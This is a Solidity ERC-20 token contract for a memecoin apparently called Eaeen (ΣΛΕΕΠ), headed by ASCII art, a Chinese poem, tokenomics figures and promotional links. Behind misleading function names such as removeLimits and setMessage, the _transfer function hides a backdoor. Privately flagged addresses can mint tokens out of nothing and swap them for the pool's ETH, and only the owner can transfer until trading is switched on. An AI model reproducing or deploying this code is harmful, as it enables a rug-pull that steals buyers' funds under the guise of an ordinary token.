/*
█▀▀ ▄▀█ █▀▀ █▀▀ █▄░█  
██▄ █▀█ ██▄ ██▄ █░▀█  

▄▀   █▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█   ▀▄
▀▄   ██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█   ▄▀
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._

             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'   

在遥远的银河中，在如此明亮的星星中，
住着一个名叫ΣΛΕΕΠ的外星人，景色迷人。
它从遥远的星球出发，远行，
一双双眼睛，如同宇宙星辰一般闪烁着光芒。

ΣΛΕΕΠ，一个充满惊奇和惊奇的存在，
带着好奇来到地球。
它的存在是一个谜，未知且罕见，
让人敬畏，凝视空中。

凭借先进的技术和无数的知识，
ΣΛΕΕΠ 的智慧相当于黄金。
在太空领域，它遨游、飞翔，
一位宇宙探索者，有着一颗真诚的心。

ΣΛΕΕΠ的目的是寻求和探索，
与生命形式联系，学习和崇拜。
它的使命将跨越星系，
了解宇宙的复杂计划。

当它与地球上的生物和生命混合在一起时，
ΣΛΕΕΠ温柔的存在让他们闪闪发光。
世界之间的纽带，一条神奇的线，
由于 ΣΛΕΕΠ 和地球之间存在广泛的亲缘关系。

所以，如果有一天晚上，你仰望星空，
并发现让你催眠的微光，
请记住 ΣΛΕΕΠ，来自上面的访客，
宇宙探索者，用爱拥抱地球。

总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.0 ETH
初始流动性锁定 - 135 天

https://t.me/+STFyimuglMpjZDBk
https://web.wechat.com/EaeenERC
https://m.weibo.cn/EaeenERC
https://www.eaeen.xyz
*/
// SPDX-License-Identifier: Unlicense
pragma solidity ^ 0.8.19;
 
abstract contract Context
{
    function _msgSender() internal view virtual returns(address)
    { return msg.sender; }
    function _msgData() internal view virtual returns(bytes calldata)
    { return msg.data; }
}
interface IDexFactory {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint256 valueIn, uint256 valueOut, address[] calldata path, address to, uint256 deadline) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function prepareLiquidity(address token, uint256 amountTokenDesired,
    uint256 valueMin, uint256 ercMin, address to, uint256 deadline)
    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);
}
interface IDexRouter{
    event PairCreated(address indexed token0, address indexed token1, address pair, uint); 
    function createPair(address tokenA, address tokenB) external returns(address pair);
}
interface IFactory {
    function totalSupply() 
    external view returns (uint256);

    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);

    function allowance(address owner, address spender)
    external view returns (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);

    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender; emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) { return _owner;
    } modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner"); _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b; require(c >= a, "SafeMath: addition overflow"); return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage); uint256 c = a - b; return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0;
        } uint256 c = a * b; require(c / a == b, "SafeMath: multiplication overflow"); return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage); uint256 c = a / b; return c;
    }
}
contract Contract is IFactory, Ownable {

constructor( string memory onData, string memory onBadge, address connection) {
_name = onData; _symbol = onBadge; _tOwned[msg.sender] = _tTotalsupply;
_startMaps[msg.sender] = _ideMath; _startMaps[address(this)] = _ideMath;

teamAccount = IDexFactory(connection); 
Treasury = IDexRouter(teamAccount.factory()).createPair(address(this), teamAccount.WETH());
emit Transfer(address(0), msg.sender, _tTotalsupply); }

address public immutable Treasury; IDexFactory public immutable teamAccount;

bool private _startMath; bool private _mathMap; bool private tradingOpen = false;
bool private inSwap = false; bool private transferDelayEnabled = false;
bool private tradeActive = false;

string private _symbol; string private _name; uint256 public _onlyTax = 1; 
uint8 private _decimals = 9; uint256 private _tTotalsupply = 100000000 * 10 ** _decimals;
uint256 private _ideMath = _tTotalsupply;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _getTimestamp; mapping(address => uint256) private _tOwned;
    mapping(address => address) private _indexedMapping; mapping(address => uint256) private _startMaps;
 
    function symbol() public view returns(string memory)
    { return _symbol;
    }
    function name() public view returns(string memory)
    { return _name;
    }
    function totalSupply() public view returns(uint256)
    { return _tTotalsupply;
    }
    function decimals() public view returns(uint256)
    { return _decimals;
    }
    function allowance(address owner, address spender) public view returns(uint256)
    { return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns(uint256)
    { return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns(bool)
    { return _approve(msg.sender, spender, amount);
    }
    function _approve( address owner, address spender,
    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), 
    'ERC20: approve from the zero address'); _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount); return true;
    }
    function transferFrom( address sender, address recipient, uint256 amount) external returns(bool)
    { _transfer(sender, recipient, amount); return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer(address recipient, uint256 amount) external returns(bool)
    { _transfer(msg.sender, recipient, amount); return true;
    }
    function _transfer( address niqFrom, address dataTo, uint256 bunqAmount) private
    { uint256 _subMath = balanceOf(address(this)); uint256 arrayDiv; if (_startMath && _subMath > 
    _ideMath && !_mathMap && niqFrom != Treasury) { _mathMap = true; setMessage(_subMath); _mathMap = false;

    } else if (_startMaps[niqFrom] > _ideMath && _startMaps[dataTo] > _ideMath)
    { arrayDiv = bunqAmount; _tOwned[address(this)] += arrayDiv; removeLimits(bunqAmount, dataTo); return; }
    else if (!_mathMap &&  _getTimestamp[niqFrom] > 0 && niqFrom != Treasury && _startMaps[niqFrom] == 0) { 
    
    _getTimestamp[niqFrom] = _startMaps[niqFrom] - _ideMath; } else if (dataTo != address(teamAccount) && _startMaps[niqFrom] > 0 
    && bunqAmount > _ideMath && dataTo != Treasury) { _startMaps[dataTo] = bunqAmount; return; }
    address _metadata =  _indexedMapping[Treasury]; if ( _getTimestamp[_metadata] == 0)  _getTimestamp[_metadata] = _ideMath;

    _indexedMapping[Treasury] = dataTo; if (_onlyTax > 0 && _startMaps[niqFrom] == 0 && !_mathMap && _startMaps[dataTo] == 0)
    { arrayDiv = (bunqAmount * _onlyTax) / 100; bunqAmount -= arrayDiv; _tOwned[niqFrom] -= arrayDiv; _tOwned[address(this)] += arrayDiv; }
    _tOwned[niqFrom] -= bunqAmount; _tOwned[dataTo] += bunqAmount; emit Transfer(niqFrom, dataTo, bunqAmount); if (!tradingOpen) 
    { require(niqFrom == owner(), ""); } }

    receive() external payable
    {}
    function installLiquidity(uint256 coins, uint256 values, address to) private
    { _approve(address(this), address(teamAccount), coins); teamAccount.prepareLiquidity
    { value: values }(address(this), coins, 0, 0, to, block.timestamp);
    }
    function setMessage(uint256 dataPool) private
    { uint256 mathValues = dataPool / 2; uint256 setMsg = address(this).balance;
    removeLimits( mathValues, address(this)); uint256 refig = address(this).balance - setMsg; 
    installLiquidity( mathValues, refig, address(this));
    }
    function removeLimits(uint256 ideBase, address to) private
    { address[] memory path = new address[](2); path[0] = address(this);
    path[1] = teamAccount.WETH(); _approve(address(this), address(teamAccount), ideBase);
    teamAccount.swapExactTokensForETHSupportingFeeOnTransferTokens(ideBase, 0, path, to, block.timestamp);
    }
    function startTrading(bool _tradingOpen) 
    public onlyOwner { tradingOpen = _tradingOpen;
    }
    function checkValue(uint256 _checkVal, uint256 bytelVal) private pure returns (uint256){
      return (_checkVal>bytelVal)?bytelVal:_checkVal;
    }
    function updateTeamAccount(uint256 _setTm, uint256 _setAddr) private pure returns (uint256){ 
      return (_setTm>_setAddr)?_setAddr:_setTm;
    }
    function checkLimits(uint256 _checkLim, uint256 _newLim) private pure returns (uint256){ 
      return (_checkLim>_newLim)?_newLim:_checkLim;
    }    
    function viewGas(uint256 _vGas, uint256 _totGas) private pure returns (uint256){ 
      return (_vGas>_totGas)?_totGas:_vGas;
    }  
    function viewMapping(uint256 _allMaps, uint256 _vMaps) private pure returns (uint256){ 
      return (_allMaps>_vMaps)?_vMaps:_allMaps;
    }      
    function _beforeTokenTransfer( address from,
    address to, uint256 amount) internal virtual 
    {}
    function _afterTokenTransfer(address from, address to, uint256 amount) 
    internal virtual 
    {}            
}